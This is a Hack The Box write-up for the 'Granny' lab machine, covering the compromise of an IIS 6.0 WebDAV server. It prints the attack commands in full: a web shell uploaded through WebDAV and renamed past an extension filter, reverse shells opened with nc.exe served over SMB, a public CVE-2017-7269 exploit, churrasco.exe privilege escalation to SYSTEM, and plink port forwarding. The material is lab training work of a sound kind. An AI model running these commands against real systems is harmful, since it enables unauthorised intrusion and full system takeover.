---
layout: post
title:  "Granny Writeup - Hack The Box"
date:   2025-05-12
desc: ""
keywords: "HTB,OSCP,eWPT,eJPT,Windows,ASPX WebShell,WebDAV,Churrasco - Token Kidnapping,Easy"
categories: [HTB]
tags: [HTB,OSCP,eWPT,eJPT,Windows,ASPX WebShell,WebDAV,Churrasco - Token Kidnapping,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/granny_writeup/Granny.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

The next challenge I chose to continue my **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** practice is the **Granny** machine, with a community score of **Easy**. But I always consider that it is very subjective the complexity issue, it depends a lot on the knowledge of each one, at least I learned a lot from this box, since it allowed me to incorporate some tools that I did not know to my set of favorite scripts and enumeration techniques that improved my knowledge of **Windows** machines.

<br /><br />
<img src="{{ site.img_path }}/granny_writeup/Granny_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I start the lab with the most important phase of any pentesting work (**Reconnaissance**), it is essential not to lose sight of any information that may allow me to find the right way to engage the machine. With `ping` I validate that the connectivity with the lab is established, with `nmap` I can get all the information of the available ports and services, in this case it only finds port **80** but it also gives me very relevant information of the allowed methods with which I can interact with it. With `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I can't find much relevant information, but with `nmap` I can search for hidden directories on the web page and it finds one with a very suggestive name (**_private**).

```bash
ping -c 3 10.10.10.15
whichSystem.py 10.10.10.15
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.15 -oG allPorts
nmap -sCV -p80 10.10.10.15 -oN targeted
cat targeted
# Microsoft IIS httpd 6.0
# Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK

whatweb http://10.10.10.15
# http://10.10.10.15/

nmap --script http-enum -p80 10.10.10.15 -oN webScan
# /_private

# http://10.10.10.15/_private/
```

<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I access the leaked path with `nmap`, I can see that it exists but it does not have any content, and I know this because it has **directory listing** enabled. As the technology is **WebDAV** I can use the **[DAVTest](https://code.google.com/archive/p/davtest/){:target="_blank"}** tool to check if I can upload malicious files to the server using the different methods. The tool informs me that I can upload files with different extensions but I can only execute **.txt** files, unfortunately being a **Windows** machine I need to upload **asp** or **aspx** files. Fortunately I have the **MOVE** method enabled so I can upload a **WebShell** with `cadaver` in a **.aspx** file with double extension and then rename it.

> **[DAVTest](https://code.google.com/archive/p/davtest/){:target="_blank"}** tests **WebDAV** enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target. It is meant for penetration testers to quickly and easily determine if enabled **DAV** services are exploitable.

> **[cadaver](https://www-kali-org.translate.goog/tools/cadaver/?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es){:target="_blank"}** supports file upload, download, on-screen display, in-place editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and resource locking. Its operation is similar to the standard **BSD** ftp client and the Samba Project’s smbclient.

```bash
davtest
davtest -url http://10.10.10.15

locate cmd.aspx
cp /usr/share/davtest/backdoors/aspx_cmd.aspx ./pwn3d.aspx.txt
cadaver --help
cadaver http://10.10.10.15
  dav:/> put pwn3d.aspx.txt
  dav:/> ls
  dav:/> move pwn3d.aspx.txt pwn3d.aspx
  dav:/> ls
  dav:/> quit
# :)
```

<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have successfully uploaded the **WebShell** to the server, I check that it is accessible from the Root of the server, and indeed it does exist. I can now enumerate the system with some basic commands to check which account I engaged or if it is the target machine and not a container, finally I can access the system using one of the many methods that exist. I only have to create a shared resource with `impacket-smbserver` and make available the `nc.exe` binary, then from the victim machine I access it and run it to get a **Reverse Shell** on a port previously opened with `nc`.

```bash
# http://10.10.10.15/pwn3d.aspx
# whoami, ipconfig

locate nc.exe
cp /usr/share/SecLists/Web-Shells/FuzzDB/nc.exe ./nc.exe
impacket-smbserver smbFolder $(pwd) -smb2support
rlwrap -cAr nc -nlvp 443

# http://10.10.10.15/pwn3d.aspx
# \\10.10.14.56\smbFolder\nc.exe -e cmd 10.10.14.56 443
# :)
```

<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

There is another way to engage the machine, the **IIS** server version is old and with `searchsploit` I could find several exploits, there is one written in **Python** that exploits a **Buffer Overflow** that may allow me to exploit a **RCE**. The vulnerability exploits the **PROPFIND** method (the server has it enabled), unfortunately the script is configured to run the `calc.exe` binary, so I'm going to look for an exploit in **Github** with the **CVE** of the vulnerability. There are several resources, but I find one from **[g0rx](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269){:target="_blank"}** that automates the compromise and gives me a **Reverse Shell**, I download it on my machine and again I get access to the machine.

> **Attacker Machine**:

```bash
searchsploit iis 6.0

searchsploit -x windows/remote/41738.py
searchsploit -w windows/remote/41738.py
# CVE: 2017-7269

git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
python3 iis_6_exploit.py
python2 iis_6_exploit.py

rlwrap -cAr nc -nlvp 443
python2 iis_6_exploit.py 10.10.10.15 80 10.10.14.56 443
# :)
```

> **Victime Machine**:

```cmd
whoami
ipconfig
```

<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The account I successfully engaged does not have many privileges to access different paths, but it has the **SeImpersonatePrivilege** enabled so I can use the **[Rotten Potato to Escalate Privileges](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/){:target="_blank"}**. I check the **OS** version and the **architecture** of the machine and I already have a doubt that the `juicyPotato.exe` from **[ohpe](https://github.com/ohpe/juicy-potato){:target="_blank"}** will work, but I will try it just in case. I just need to download the exploit on my machine and share it with `impacket-smbserver` to transfer it to the target machine and when I run it, it informs me that it does not work for this machine. In the list of **Windows CLSID** available in the **[ohpe](https://github.com/ohpe/juicy-potato){:target="_blank"}** page, the versions are listed and I check that the version of the **Granny** machine is not there.

> **Victime Machine**:

```cmd
whoami /priv
whoami /all
systeminfo
# OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
# System Type:               X86-based PC
```

> **Attacker Machine**:

```bash
mv /home/al3j0/Downloads/JuicyPotato.exe .
mv JuicyPotato.exe JP.exe
impacket-smbserver smbFolder $(pwd) -smb2support
```

> **Victime Machine**:

```cmd
copy \\10.10.14.56\smbFolder\JP.exe .\JP.exe
.\JP.exe
# The image file C:\WINDOWS\Temp\privesc\JP.exe is valid, but is for a machine type other than the current machine.
# :(

systeminfo
# OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
```

<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After doing some research on the **Internet** in search of **[Escalate Privileges with JuicyPotato.exe for Windows Serer 2003](https://binaryregion.wordpress.com/2021/06/14/privilege-escalation-windows-juicypotato-exe/){:target="_blank"}** I find the resource **[Escalate Privileges with churrasco.exe](https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/){:target="_blank"}**. So I **[download the binary recommended](https://github.com/Re4son/Churrasco/raw/master/churrasco.exe){:target="_blank"}** in the publication and transfer it to the victim machine, but when I run it it does not work the first time, maybe I'm doing something wrong, but just in case I run it again and this time if I succeed to escalate privileges. If I download the `churrasco.exe` binary directly from **[Github](https://github.com/Re4son/Churrasco/blob/master/churrasco.exe){:target="_blank"}**, I also have problems in the first executions, but after several attempts I succeed in executing commands impersonating the user with maximum privileges. After exploiting the vulnerability, I get a **Reverse Shell** with `nc.exe` and I can now access the two flags to validate in **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** the lab engagement.

> **churrasco** exploit is similar to **juicypotato** exploit. In some scenarios **JuicyPotato** exploit is not compatible with the older systems like **Windows server 2003** or **Windows XP**. It’s a Windows privilege escalation from “service” accounts to “NT AUTHORITY\SYSTEM” account.

> **Attacker Machine**:

```bash
mv /home/al3j0/Downloads/churrasco.exe .
impacket-smbserver smbFolder $(pwd) -smb2support
```

> **Victime Machine**:

```cmd
copy \\10.10.14.56\smbFolder\churrasco.exe .\churrasco.exe
```

> **Attacker Machine**:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
rlwrap -cAr nc -nlvp 443
```

> **Victime Machine**:

```cmd
.\churrasco.exe -d "\\10.10.14.56\smbFolder\nc.exe -e cmd 10.10.14.56 443"
# :(
```

> **Attacker Machine**:

```bash
mv /home/al3j0/Downloads/churrasco.exe .
impacket-smbserver smbFolder $(pwd) -smb2support
```

> **Victime Machine**:

```cmd
erase churrasco.exe
copy \\10.10.14.56\smbFolder\churrasco.exe .\churrasco.exe
```

> **Attacker Machine**:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
rlwrap -cAr nc -nlvp 443
```

> **Victime Machine**:

```cmd
.\churrasco.exe -d "\\10.10.14.56\smbFolder\nc.exe -e cmd 10.10.14.56 443"
# :( ?
.\churrasco.exe -d "whoami"
```

> **Attacker Machine**:

```bash
tcpdump -i tun0 icmp -n
```

> **Victime Machine**:

```cmd
.\churrasco.exe -d "ping 10.10.14.56"
# :)

.\churrasco.exe -d "\\10.10.14.56\smbFolder\nc.exe -e cmd 10.10.14.56 443"
.\churrasco.exe "\\10.10.14.56\smbFolder\nc.exe -e cmd 10.10.14.56 443"
# :)
```

<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

An interesting thing about the machine is that it has port **445** of the **SMB** protocol open. I can try to forward the local port 445 of the box to port 445 of my attacking machine with **[PuTTy's](https://the.earth.li/~sgtatham/putty/0.58/htmldoc/Chapter7.html){:target="_blank"}** `plink.exe` tool to be able to access, download content to the machine. Before I must make some modifications to the **SSH** service configuration on my machine so that when I connect from the **Granny** box I succeed to authenticate and allows me to succeed my goal, unfortunately the port 445 does not succeed to connect, I think due to some problems or restrictions of **IPTables** or **Firewall**.

> **[plink.exe](https://the.earth.li/~sgtatham/putty/0.58/htmldoc/Chapter7.html){:target="_blank"}** in Kali Linux, a command-line **PuTTY** tool, is a versatile command-line SSH client used for various network tasks, including secure connections, port forwarding, and tunneling. It's often employed for automating tasks and scripting.

> **Victime Machine**:

```cmd
netstat -ano
```

> **Attacker Machine**:

```bash
locate plink.exe
impacket-smbserver smbFolder $(pwd) -smb2support
```

> **Victime Machine**:

```cmd
copy \\10.10.14.56\smbFolder\plink.exe .\plink.exe
.\plink.exe
```

> **Attacker Machine**:

```bash
nvim /etc/ssh/ssh_config
# PermitRootLogin  yes
passwd root
systemctl status ssh
systemctl start ssh
```

> **Victime Machine**:

```cmd
.\plink.exe -l root -pw hola123 -R 445:127.0.0.1:445 10.10.14.56
```

> **Attacker Machine**:

```bash
lsof -i:445
# :(
```

<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/granny_writeup/Granny_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> Another machine completed in **[Hack The Box](https://www.hackthebox.com){:target="_blank"}**, which leaves me with a very satisfactory sensation since machines with **Windows Operating Systems** have become my obsession. It's time to get more demanding with myself and keep solving more boxes, so I'm going to look for the next one on the platform. I kill the box and let new challenges come.

<br /><br />
<img src="{{ site.img_path }}/granny_writeup/Granny_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
